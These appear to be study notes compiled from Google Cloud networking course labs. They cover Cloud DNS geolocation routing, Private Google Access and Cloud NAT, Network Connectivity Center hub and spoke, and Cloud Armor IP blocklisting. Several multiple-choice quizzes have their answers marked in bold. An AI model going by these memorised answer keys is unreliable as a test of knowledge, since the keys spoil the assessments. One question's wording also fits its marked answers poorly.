So far you have tested the setup from the United States and Europe. You have servers running in both the regions and have matching record sets for both the regions in Cloud DNS routing policy. There is no matching policy item for the region within Asia (selected earlier) in the Cloud DNS routing policy.

The Geolocation policy will apply a "nearest" match for source location when the source of the traffic doesn't match any policy items exactly. This means that the Asia client should be directed to the nearest web server.

In this section, you will resolve the `geo.example.com` domain from the client VM in Asia and will analyze the response.

1. SSH into the asia-client-vm. For `<SELECTED-ZONE>`, use the zone that you used to create the Asia client.

```
gcloud compute ssh asia-client-vm --zone <SELECTED-ZONE> --tunnel-through-iap
```



1. Then access geo.example.com:

```
for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
```



1. Analyze the output to see which server is responding to the request. Since there is no policy item for any of the Asia regions, Cloud DNS will direct the client to the nearest server.
2. Once you have run the test multiple times, exit the client VM in Asia by typing "`exit`" in the VM's command prompt.

#### Task 9. Delete lab resources

Although all resources you used in this lab will be deleted when you finish, it is good practice to remove resources you no longer need to avoid unnecessary charges.

- The following `gcloud` commands will delete all the resources that were created in the lab. (Note that `SELECTED-ZONE` is the Asia zone that you wrote down earlier.)

```
#delete VMS
gcloud compute instances delete -q us-client-vm --zone "ZONE"

gcloud compute instances delete -q us-web-vm --zone "ZONE"

gcloud compute instances delete -q europe-client-vm --zone "Zone 2"

gcloud compute instances delete -q europe-web-vm --zone "Zone 2"

gcloud compute instances delete -q asia-client-vm --zone SELECTED-ZONE

#delete FW rules
gcloud compute firewall-rules delete -q allow-http-traffic

gcloud compute firewall-rules delete fw-default-iapproxy

#delete record set
gcloud dns record-sets delete geo.example.com --type=A --zone=example

#delete private zone
gcloud dns managed-zones delete example
```



#### Congratulations

In this lab, you configured and used Cloud DNS routing policies with Geolocation routing policy. You also verified the configuration and behavior of the Cloud DNS routing policy by observing the HTTP response when accessing the web servers.

### Quiz

1. To set up hybrid deployments for DNS resolution, which type of DNS policy should you use?
- **Server policy**
- Response policy
- Traffic policy
- Routing policy

2. You must create a VM that has an IPv6 address. How do you do it?
- Create a single-stack subnet, and create the VM with an IPv6 address.
- Create a single-stack subnet with IPv6 enabled, and then create the VM with an IPv4 address.
- **Create a dual-stack subnet, and create the VM with an IPv6 address.**
- Create a single-stack network, and create the VM with an IPv6 address.

## Private Connection Options

### LAB - Implement Private Google Access and Cloud NAT

Overview

In this lab, you implement Private Google Access and Cloud NAT for a VM instance that doesn't have an external IP address. Then, you verify access to public IP addresses of Google APIs and services and other connections to the internet.

VM instances without external IP addresses are isolated from external networks. Using Cloud NAT, these instances can access the internet for updates and patches, and in some cases, for bootstrapping. As a managed service, Cloud NAT provides high availability without user management and intervention.

Objectives

In this lab, you learn how to perform the following tasks:

- Configure a VM instance that doesn't have an external IP address

- Connect to a VM instance using an Identity-Aware Proxy (IAP) tunnel

- Enable Private Google Access on a subnet

- Configure a Cloud NAT gateway

- Verify access to public IP addresses of Google APIs and services and other connections to the internet



For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.

2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.

3. When ready, click **Start lab**.

4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.

5. Click **Open Google Console**.

6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.

7. Accept the terms and skip the recovery resource page.

   **Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Task 1. Create the VM instance

Create a VPC network with some firewall rules and a VM instance that has no external IP address, and connect to the instance using an IAP tunnel.

Create a VPC network and firewall rules

First, create a VPC network for the VM instance and a firewall rule to allow SSH access.

1. In the Cloud Console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > VPC networks**.

2. Click **Create VPC Network**.

3. For **Name**, type **privatenet**.

4. For **Subnet creation mode**, click **Custom**.

5. In **New Subnet** specify the following, and leave the remaining settings as their defaults:

    | Property           | Value (type value or select option as specified) |
    | :----------------- | :----------------------------------------------- |
    | Name               | privatenet-us                                    |
    | Region             | `REGION`                                         |
    | IPv4 address range | 10.130.0.0/20                                    |

    **Note:** Don't enable **Private Google access** yet!

    

6. Click **Done**.

7. Click **Create** and wait for the network to be created.

8. In the left pane, click **Firewall**.

9. Click **Create Firewall Rule**.

10. Specify the following, and leave the remaining settings as their defaults:

    | Property            | Value (type value or select option as specified) |
    | :------------------ | :----------------------------------------------- |
    | Name                | privatenet-allow-ssh                             |
    | Network             | privatenet                                       |
    | Targets             | All instances in the network                     |
    | Source filter       | IPv4 ranges                                      |
    | Source IPv4 ranges  | 35.235.240.0/20                                  |
    | Protocols and ports | Specified protocols and ports                    |

11. For **tcp**, click the checkbox and specify port **22**.

12. Click **Create**.

     **Note:** In order to connect to your private instance using SSH, you need to open an appropriate port on the firewall. [IAP connections](https://cloud.google.com/iap/docs/using-tcp-forwarding) come from a specific set of IP addresses (**35.235.240.0/20**). Therefore, you can limit the rule to this CIDR range.

     Create the VM instance with no public IP address

     

1. In the Cloud Console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Compute Engine > VM instances**.

2. Click **Create Instance**.

3. On the **Machine configuration** page, specify the following, and leave the remaining settings as their defaults:

 | Property     | Value (type value or select option as specified) |
 | :----------- | :----------------------------------------------- |
 | Name         | vm-internal                                      |
 | Region       | `REGION`                                         |
 | Zone         | `ZONE`                                           |
 | Series       | E2                                               |
 | Machine type | e2-medium (2vCPU, 1 core, 4 GB memory)           |

4. Click **OS and storage**.

5. If the **Image** shown is not **Debian GNU/Linux 12 (bookworm)**, click **Change** and select **Debian GNU/Linux 12 (bookworm)**, and then click **Select**.

6. Click **Networking**.

7. In **Network interfaces**, edit the network interface by specifying the following:

 | Property              | Value (type value or select option as specified) |
 | :-------------------- | :----------------------------------------------- |
 | Network               | privatenet                                       |
 | Subnetwork            | privatenet-us                                    |
 | External IPv4 address | None                                             |

**Note:** The default setting for a VM instance is to have an ephemeral external IP address. This behavior can be changed with a policy constraint at the organization or project level. To learn more about controlling external IP addresses on VM instances, refer to the [external IP address documentation](https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address#disableexternalip).



8. Click **Done**.

9. Click **Create**, and wait for the VM instance to be created.

10. On the **VM instances** page, verify that the **External IP** of **vm-internal** is **None**.

Click **Check my progress** to verify the objective.

Create the VM instance



SSH to vm-internal to test the IAP tunnel

1. In the Cloud Console, click **Activate Cloud Shell** (![Cloud Shell](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).

2. If prompted, click **Continue**.

3. To connect to **vm-internal**, run the following command:

   

```
gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap
```

4. If prompted click **Authorize**

5. If prompted to continue, type **Y**.

6. When prompted for a passphrase, press **ENTER**.

7. When prompted for the same passphrase, press **ENTER**.

Did the command prompt change to @vm-internal? 

- True
- False

8. To test the external connectivity of **vm-internal**, run the following command:

``` 
ping -c 2 www.google.com
```

This should not work because **vm-internal** has no external IP address!

9. Wait for the `ping` command to complete.

10. To return to your Cloud Shell instance, run the following command:

```
 exit
```

**Note:** When instances do not have external IP addresses, they can only be reached by other instances on the network via a managed VPN gateway or via a Cloud IAP tunnel. Cloud IAP enables context-aware access to VMs via SSH and RDP without bastion hosts. To learn more about this, see the blog post [Cloud IAP enables context-aware access to VMs via SSH and RDP without bastion hosts](https://cloud.google.com/blog/products/identity-security/cloud-iap-enables-context-aware-access-to-vms-via-ssh-and-rdp-without-bastion-hosts).

#### Task 2. Enable Private Google Access

VM instances that have no external IP addresses can use Private Google Access to reach external IP addresses of Google APIs and services. By default, Private Google Access is disabled on a VPC network.

Create a Cloud Storage bucket

Create a Cloud Storage bucket to test access to Google APIs and services.

1. In the Cloud Console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Cloud Storage > Buckets**.

2. Click **Create**.

3. Specify the following, and leave the remaining settings as their defaults:

 | Property      | Value (type value or select option as specified) |
 | :------------ | :----------------------------------------------- |
 | Name          | *Enter a globally unique name*                   |
 | Location type | Multi-region                                     |

4. Click **Create**. If prompted to enable public access prevention, ensure it is checked and cick **Confirm**. Note the name of your storage bucket.

5. Store the name of your bucket in an environment variable:

```
 export MY_BUCKET=[enter your bucket name here]
```

6. Verify it with echo:

```
 echo $MY_BUCKET
```

Copy an image file into your bucket

Copy an image from a public Cloud Storage bucket to your own bucket.



1. In Cloud Shell, run the following command:

```
 gcloud storage cp gs://cloud-training/gcpnet/private/access.svg gs://$MY_BUCKET
```

2. In the Cloud Console, click your bucket name to verify that the image was copied.

You can click on the name of the image in the Cloud Console to view an example of how Private Google Access is implemented.

Access the image from your VM instance

Currently, which of your VM instances can access the image from your bucket?

- vm-internal

- Cloud Shell



1. In Cloud Shell, to try to copy the image from your bucket, run the following command:

```
 gcloud storage cp gs://$MY_BUCKET/*.svg .
```

This should work because Cloud Shell has an external IP address!

2. To connect to **vm-internal**, run the following command:

```
 gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap
```

3. If prompted, type **Y** to continue.

4. Store the name of your bucket in an environment variable:

```
 export MY_BUCKET=[enter your bucket name here]
```

5. Verify it with echo:

```
 echo $MY_BUCKET
```

6. Try to copy the image to **vm-internal**, run the following command:

```
 gcloud storage cp gs://$MY_BUCKET/*.svg .
```

This should not work: **vm-internal** can only send traffic within the VPC network because Private Google Access is disabled (by default).

7. Press **Ctrl+Z** to stop the request.



Enable Private Google Access

Private Google Access is enabled at the subnet level. When it is enabled, instances in the subnet that only have private IP addresses can send traffic to Google APIs and services through the default route (0.0.0.0/0) with a next hop to the default internet gateway.

1. In the Cloud Console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > VPC networks**.

2. Click **privatenet** to open the network.

3. Click **Subnets**, and then click **privatenet-us**.

4. Click **Edit**.

5. For **Private Google access**, select **On**.

6. Click **Save**.

Click **Check my progress** to verify the objective.

Create a Cloud Storage bucket and Enable Private Google Access

**Note:** Enabling Private Google Access is as simple as selecting **On** within the subnet!

7. Run the following command, in **Cloud Shell** for **vm-internal**, to try to copy the image to **vm-internal**.

```
 gcloud storage cp gs://$MY_BUCKET/*.svg .
```

This should work because **vm-internal**'s subnet has **Private Google Access** enabled!

8. To return to your Cloud Shell instance, run the following command:

```
 exit
```

9. Again type exit if needed to return to your Cloud Shell instance.

```
 exit
```

**Note:** To view the eligible APIs and services that you can use with Private Google Access, see supported services in the [Private access options for services Guide](https://cloud.google.com/vpc/docs/private-access-options#pga-supported).



#### Task 3. Configure a Cloud NAT gateway

Although **vm-internal** can now access certain Google APIs and services without an external IP address, the instance cannot access the internet for updates and patches. Configure a Cloud NAT gateway, which allows **vm-internal** to reach the internet.

Try to update the VM instances

1. In **Cloud Shell**, to try to re-synchronize the package index, run the following:

```
 sudo apt-get update
```

The output should finish like this (**example output**):

```
 ...
 Reading package lists... Done
```

This should work because **Cloud Shell** has an external IP address!

2. To connect to **vm-internal**, run the following command:

```
 gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap
```

3. If prompted, type **Y** to continue.

4. To try to re-synchronize the package index of **vm-internal**, run the following command:

```
 sudo apt-get update
```

This should only work for Google Cloud packages because **vm-internal** only has access to Google APIs and services!

5. Press **Ctrl+C** to stop the request.

Configure a Cloud NAT gateway

Cloud NAT is a regional resource. You can configure it to allow traffic from all ranges of all subnets in a region, from specific subnets in the region only, or from specific primary and secondary CIDR ranges only.



1. On the Google Cloud console title bar, type **Network services** in the **Search**field, then click **Network services** in the **Products & Page** section.

2. On the **Network service** page, click **Pin** next to Network services.

3. Click **Cloud NAT**.

4. Click **Get started** to configure a NAT gateway.

5. Specify the following:

 | Property     | Value (type value or select option as specified) |
 | :----------- | :----------------------------------------------- |
 | Gateway name | nat-config                                       |
 | Network      | privatenet                                       |
 | Region       | `REGION`                                         |

6. For **Cloud Router**, select **Create new router**.

7. For **Name**, type **nat-router**

8. Click **Create**.

**Note:** The NAT mapping section allows you to choose the subnets to map to the NAT gateway. You can also manually assign static IP addresses that should be used when performing NAT. Do not change the NAT mapping configuration in this lab.

9. Click **Create**.

10. Wait for the gateway's status to change to **Running**.

Click **Check my progress** to verify the objective.

Configure a Cloud NAT gateway



Verify the Cloud NAT gateway

It may take up to 3 minutes for the NAT configuration to propagate to the VM, so wait at least a minute before trying to access the internet again.



1. In **Cloud Shell** for **vm-internal**, to try to re-synchronize the package index of **vm-internal**, run the following command:

```
 sudo apt-get update
```

The output should finish like this (**example output**):

```
 ...
 Reading package lists... Done
```

This should work because **vm-internal** is using the NAT gateway!

2. To return to your Cloud Shell instance, run the following command:

```
 exit
```

**Note:** The Cloud NAT gateway implements outbound NAT, but not inbound NAT. In other words, hosts outside of your VPC network can only respond to connections initiated by your instances; they cannot initiate their own, new connections to your instances via NAT.

#### Task 4. Configure and view logs with Cloud NAT Logging

Cloud NAT logging](https://cloud.google.com/nat/docs/monitoring) allows you to log NAT connections and errors. When Cloud NAT logging is enabled, one log entry can be generated for each of the following scenarios:

- When a network connection using NAT is created.

- When a packet is dropped because no port was available for NAT.

You can opt to log both kinds of events, or just one or the other. Created logs are sent to Cloud Logging.

Enabling logging

If logging is enabled, all collected logs are sent to Cloud Logging by default. You can filter these so that only certain logs are sent.

You can also specify these values when you create a NAT gateway or by editing one after it has been created. The following directions show how to enable logging for an existing NAT gateway.



1. In the Google Cloud Console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Network services** > **Cloud NAT**.

2. Click on the `nat-config` gateway and then click **Edit**.

3. Click the **Advanced configurations** dropdown to open that section.

4. For **Logging**, select **Translation and errors** and then click **Save**.



NAT logging in Cloud Logging

Now that you have set up Cloud NAT logging for the `nat-config` gateway, let's find out where we can view our logs.



1. Click on `nat-config` to expose its details. Then click on the **View in Logs Explorer**.

2. This will open a new tab with **Logs Explorer**.

You will see that there aren't any logs yet—that's because we just enabled this feature for the gateway.

**Note:** Keep this tab open and return to your other Google Cloud Console tab.



Generating logs

As a reminder, Cloud NAT logs are generated for the following sequences:

- When a network connection using NAT is created.

- When a packet is dropped because no port was available for NAT.

Let's connect the host to the internal VM again to see if any logs are generated.



1. In **Cloud Shell** for **vm-internal**, to try to re-synchronize the package index of **vm-internal**, run the following command:

```
 gcloud compute ssh vm-internal --zone ZONE --tunnel-through-iap
```

2. If prompted, type **Y** to continue.

3. Try to re-synchronize the package index of **vm-internal** by running the following:

```
 sudo apt-get update
```

The output should look like this (**example output**):

```
 ...
 Reading package lists... Done
```



4. To return to your Cloud Shell instance, run the following command:

```
 exit
```

Let's see if opening up this connection revealed anything new in our logs.



Viewing Logs



- Return to your Logs Explorer tab, and in the navigation menu, click **Logs Explorer**.

You should see two new logs that were generated after connecting to the internal VM.

**Note:** You may need to wait for a few minutes. If you are still unable to see the logs, repeat step 1 to step 4, from the **Generating logs** section, and then refresh the logging page. 

As we see, the logs give us details on the VPC network we connected to and the connection method we used. Feel free to expand different labels and details.



Task 5. Review

You created **vm-internal**, an instance with no external IP address, and connected to it securely using an IAP tunnel. Then you enabled Private Google Access, configured a NAT gateway, and verified that **vm-internal** can access Google APIs and services and other public IP addresses.

VM instances without external IP addresses are isolated from external networks. Using Cloud NAT, these instances can access the internet for updates and patches, and in some cases, for bootstrapping. As a managed service, Cloud NAT provides high availability without user management and intervention.

IAP uses your existing project roles and permissions when you connect to VM instances. By default, instance owners are the only users that have the **IAP Secured Tunnel User**role.

For how to allow other users to access your VMs using IAP tunneling, see, in the Cloud Architecture Center, [Grant access to additional users Guide](https://cloud.google.com/solutions/building-internet-connectivity-for-private-vms#grant_access_to_additional_users).



End your lab

When you have completed your lab, click **End Lab**. Google Cloud Skills Boost removes the resources you’ve used and cleans the account for you.

### Quiz

1. You want to provide access to services that you created in a VPC network. The services should be available to other specified VPC networks through endpoints that have internal IP addresses. Some of these VPC networks have subnets with overlapping internal IP addresses. Which product can you use?
- Private services access
- Private Google Access
- **Private Service Connect**
- Cloud NAT

2. To enable Private Google Access for a VPC network:
- Enable it on the VPC network.
- Enable it on the VPC network, on the desired subnets, and on Cloud Router.
- Enable it on all desired subnets and on Cloud Router.
- **Enable it on all desired subnets in the VPC network.**

3. Private services access automatically configures which Google Cloud product to implement communication between the producer and consumer VPC networks?
- **VPC Network Peering**
- Cloud NAT
- Private Google Access
- Shared VPC

## 

# 05 Networking in Google Cloud: Network Architecture

## Introduction to Network Architecture

### Quiz

1. You are designing a new network infrastructure in Google Cloud to support a global e-commerce application. Which two of the following are key considerations you should prioritize in your network design?

- To justify the need for a new network.

- To create a detailed project timeline.

- **To inform and guide design choices, ensuring the network aligns with organizational goals and constraints.**

- **To ensure high availability and disaster recovery capabilities for the network.**

2. Which of the following practices is LEAST likely to improve network security in Google Cloud?
- Regularly reviewing and updating IAM (Identity and Access Management) permissions.
- Enabling VPC flow logs to monitor network traffic.
- Implementing network firewall rules to control traffic.
- **Assigning public IP addresses to all virtual machines in a VPC.**



## Network Topologies

### LAB - Implementing a Hub and Spoke using NCC

#### Overview

In this lab, you design and implement a classic hub-and-spoke network topology. Your pre-configured environment includes three VPC networks—a central hub and two branches (spoke1 and spoke2). You will create virtual machines (VMs) on each network to test connectivity.

You begin by verifying connectivity between the VMs within and across VPCs. Then, you use NCC to implement a hub and spoke. You retest connectivity to confirm that your hub-and-spoke architecture is fully functional.

#### Objectives

In this lab, you learn how to perform the following tasks:

- Configure VMs in different VPCs.
- Test connectivity between networks before implementing a hub and spoke.
- Use NCC to create a hub and spoke.
- Test connectivity after implementing a hub and spoke.
- Use Network Topology to view metrics for traffic between entities.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Task 1. Explore the pre-configured network

The network **hub-vpc** with **hub-subnet**, **spoke1-vpc** with **spoke1-subnet**, and **spoke2-vpc** with **spoke2-subnet** along with firewall rules for **RDP**, **SSH**, and **ICMP**traffic have been configured for you.

- In the Google Cloud console, on the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > VPC networks**.
  Notice the **hub-vpc**, **spoke1-vpc**, and **spoke2-vpc** network with its subnets: **hub-subnet**, **spoke1-subnet**, and **spoke2-subnet**.

  Each Google Cloud project starts with the **default** network. In addition, the **hub-vpc**, **spoke1-vpc**, and **spoke2-vpc** network has been created for you as part of your network diagram.

  You create a VM in **hub-subnet**, **spoke1-subnet**, and **spoke2-subnet**.

#### Explore the firewall rules

1. On the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **VPC network > Firewall**.
   Notice the **app-allow-icmp** and **app-allow-ssh-rdp** firewall rules.

   These firewall rules have been created for you.

#### Task 2. Create a VM in each VPC

1. On the **Navigation menu**, click **Compute Engine > VM instances**.
2. Click **Create Instance**.
3. Specify **Name** as **hub-vm**.
4. In the left frame, click **Networking**.
5. Under **Network interfaces** , click **default**. From the **Network** dropdown select **hub-vpc**.
6. Click **Create**.

Repeat the process to create a **spoke1-vm** VM in `spoke1-vpc` and a **spoke2-vm** VM in `spoke2-vpc`.

Click **Check my progress** to verify the objective.

Create a VM in each VPC



#### Task 3: Test connectivity

spoke1-vm and spoke2-vm are in two different VPCs. Let us test the connectivity between the two.

1. On the **VM instances** page, for **spoke1-vm**, copy the internal IP address.
2. On the **VM instances** page, for **spoke2-vm**, click **SSH**.
3. Run the following command:

```
ping <internal IP address of spoke1-vm>
```



Notice how the ping fails. This should execute and display 100% packet loss. Press **Ctrl+C** to stop the command.

1. Now, SSH into **spoke1-vm** to test the connectivity from **spoke1-vm** to **spoke2-vm**:

```
ping <internal IP address of spoke2-vm>
```



Notice how the ping fails. This should execute and display 100% packet loss. Press **Ctrl+C** to stop the command.

#### Task 4: Create a hub and spoke using NCC

Network Connectivity Center lets you create VPC spokes to connect VPC networks together for full mesh connectivity.

1. On the Google Cloud console title bar, type **Network Connectivity Center** in the Search field, then click **Network Connectivity Center** in the **Products & Page**section.
2. Click **Create hub**.
3. Enter **my-hub** for **Hub Name**.
4. Click **Next step**.
5. Click **Add a spoke**.
6. Enter **spoke1** for first **Spoke Name**.
7. Select **VPC network** as the Spoke type.
8. To add a VPC network to the spoke, select **spoke1-vpc**.
9. Click Done.
10. Click **Add a spoke** to add a second spoke,
11. Enter **spoke2** for second **Spoke Name**.
12. Select VPC network as the Spoke type.
13. Choose **spoke2-vpc** as the VPC network for this spoke.
14. Click Done.
15. When you have finished adding spokes, click **Create**.

Click **Check my progress** to verify the objective.

Create a hub and spoke using NCC



#### Task 5. Retest connectivity

VPC spokes reduce the operational complexity of managing the individual pair-wise VPC Network Peering connections through the use of VPC spokes and a centralized connectivity management model. Now you retest the connectivity between the VMs from spokes.

This task has been performed for you at the start of this lab. You will need to SSH into VM and run the following command to setup the environment.

1. On the **Navigation** menu, click **Compute Engine > VM instances**.
2. Select the SSH button next to **spoke1-vm** to SSH into the VM.
3. If prompted "Allow SSH-in-browser to connect to VMs," click **Authorize**.
4. Run the following command:

```
ping -c 3 <internal IP address of spoke2-vm>
```



1. Repeat the previous steps for **spoke2-vm**.

#### Task 6. Explore the Network Topology Tool

Network Topology is a visualization tool that shows the topology of your network infrastructure. You can also view metrics and details of network traffic to other Shared VPC networks and inter-region traffic.

For each Network Topology hierarchy, the Google Cloud console displays a single metric for Compute Engine virtual machine (VM) instance entities and region entities, as well as for connections.

1. In the Google Cloud console, go to the Network Topology page.
2. Hover over an entity to display the **Expand** icon for expanding or **Collapse** icon for collapsing.
3. In the Metrics and insights section, select an insight from the options.

#### Congratulations!

In this lab, you implemented a classic hub-and-spoke network topology. You created virtual machines (VMs) on each network to test connectivity.

You started by verifying connectivity between the VMs within and across VPCs. Then, you used NCC to implement a hub and spoke. You retested connectivity to confirm that the hub-and-spoke architecture was fully functional.



### Quiz

1. You are designing a Google Cloud network for a large financial services company with strict security requirements. The network needs to isolate sensitive customer data from other resources and limit communication between specific network segments. Which of the following network topologies would be most suitable for this scenario?
- Hub-and-spoke
- Mesh
- Mirrored
- **Gated ingress and egress**

Correct! This topology allows granular control over incoming and  outgoing traffic, enabling isolation of sensitive data and restriction  of unauthorized communication between segments.

2. You are migrating a large ecommerce company's existing on-premises data center to Google Cloud. The on-premises network consists of geographically dispersed regional offices, each with its own network segment requiring secure isolation. However, central management and communication between all regional offices are critical for business operations. Which network topology would most effectively address these requirements in Google Cloud?
- Mesh
- Mirrored
- Gated ingress and egress
- **Hub-and-spoke**

Correct! This topology establishes a central VPC (the "hub") in Google  Cloud, connecting all regional VPCs ("spokes") securely. This  configuration facilitates centralized management, enforces security  policies, and provides a cost-effective and manageable solution for  migrating the on-premises network while maintaining regional isolation  and communication.



## 

# 06 Networking in Google Cloud: Network Security



## Distributed Denial of Service (DDoS) Protection



### LAB - Configuring Traffic Blocklisting with Google Cloud Armor



#### Overview

HTTP(S) Load balancing is implemented at the edge of Google's network in Google's points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google's global network to the closest backend that has sufficient capacity available.

[Google Cloud Armor](https://cloud.google.com/armor) IP blocklists/allowlists enable you to restrict or allow access to your HTTP(S) load balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your virtual private cloud (VPC) networks.

In this lab, you will verify that the HTTP load balancer with global backends is deployed. This load balancer is automatically provisioned for you during startup. You will then create a VM to test access to the load balancer. Finally, you will stress test the load balancer and blocklist the stress test IP with Google Cloud Armor.

#### Objectives

In this lab, you will learn how to perform the following tasks:

- Verify that the HTTP load balancer is deployed.
- Create a VM to test access to the HTTP load balancer.
- Use Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Task 1. Verify the HTTP load balancer is deployed

In this task, you verify that the global HTTP load balancer is deployed. The HTTP load balancer is automatically created when you start the lab. This will be used for a simple web application. This application is deployed to demonstrate the capabilities of Google Cloud Armor.

1. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)). If prompted, click **Continue**.
2. Verify that the load balancer is deployed and registered by executing the following command:

```
gcloud compute backend-services get-health web-backend --global
```



**Note:** Rerun this command and wait until this command returns that three instances are HEALTHY. You can also monitor it in the console (**Navigation menu > View All Products > Network services > Load balancing**).

1. Retrieve the load balancer IP address by executing the following command:

```
gcloud compute forwarding-rules describe web-rule --global
```



1. Copy the value for the **IPAddress** property.

Keep track of this IP address. It will also be used in a later section.

1. Open a new browser tab and try to visit that IP address `http://{IP_ADDRESS}`.

Replace `{IP_ADDRESS}` with the IP address of the load balancer. Do not include the curly braces when you are asked to provide the IP address.

If you get a message that the IP address doesn't support a secure connection, click **Continue to site**.

Keep refreshing the page until you see a page with a message similar to this:

![Web server notification; the server is in zone X](images/TejCgv4DW0Lq%2FQg5JjVV6H4dNY%2FEeZPTWo03qa3reCk%3D.png)

**Note:** It might take a couple of minutes to access the HTTP load balancer. In the meantime, you might get 404 or 502 errors. Keep trying until you see the page of one of the backends.

1. In Cloud shell, use the following `curl` command to access the IP address:

```
while true; do curl -m1 {IP_ADDRESS}; done
```



The responses will be from backends that have been created in different zones.

1. Press **CTRL+C** to stop the previous command.

#### Task 2. Create a VM to test access to the load balancer

1. Go to **Navigation menu > Compute Engine**.

2. Click **Create Instance**.

3. On the **Machine configuration** page, enter the following values:

   | **Field** | **Value** (type or select) |
   | :-------- | :------------------------- |
   | Name      | access-test                |
   | Region    | `REGION`                   |
   | Zone      | `ZONE`                     |

4. Leave everything else at the default and click **Create**.

5. Once launched, click the **SSH** button to connect to the instance.

6. Run the following command on the instance to access the load balancer:

```
curl -m1 {IP_ADDRESS}
```



The output should look similar to:

```
<!doctype html><html><body><h1>Web server</h1><h2>This server is in zone: projects/104716457480/zones/ZONE</h2> </body></html>
```

Click *Check my progress* to verify the objective.

Create a VM to test access to the load balancer.



#### Task 3. Create a security policy with Google Cloud Armor

#### Blocklist the access-test VM

**Note:** You will now create a security policy to blocklist access to the load balancer from the access-test VM. This policy can be used to block access from a malicious client. There are ways to identify the external IP address of a client trying to access your HTTP load balancer. For example, you could examine traffic captured by VPC Flow Logs in BigQuery to determine a high volume of incoming requests.

1. Go to **Navigation menu > Compute engine**, click **access-test** VM and scroll down to **Network interface** and then copy the **External IP address**.
2. From the **Navigation menu** > **View All Products**. Go to **Networking** section, click **Network Security** > **Cloud Armor policies**.
3. Click **Create policy**.
4. Provide a name as **blocklist-access-test** and set the **Default rule action** to **Allow**.
5. Click **Next step**.
6. Click **Add rule**.
7. Set the following values, leave all other values at their defaults:

| **Property**  | **Value**                                       |
| ------------- | ----------------------------------------------- |
| Mode          | Basic mode (IP addresses/ranges only)           |
| Match         | Enter the External IP of the **access-test** VM |
| Action        | Deny                                            |
| Response code | 404 (Not Found)                                 |
| Priority      | 1000                                            |

**Note:** Notice that you are setting the Deny status to 404.

1. Click **SAVE CHANGE TO RULE**.
2. Click **Next step**.
3. Click **+ Add Target**.
4. For **Type 1**, select **Backend service (external application load balancer)**.
5. For **Backend Service target 1**, select **web-backend**.
6. Click **Next step**.
7. Click **Done**.
8. Click **Create policy**.

**Note:** Alternatively, you could set the default rule to Deny and only allow list traffic from authorized users/IP addresses.

Wait for the policy to be created before moving to the next step.

#### Verify the security policy

1. Return to the SSH session of the access-test VM.
2. Run the `curl` command again on the instance to access the load balancer:

```
curl -m1 {IP_ADDRESS}
```



The output should look as follows.

**Output:**

```
<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>404</title>404 Not Found
```

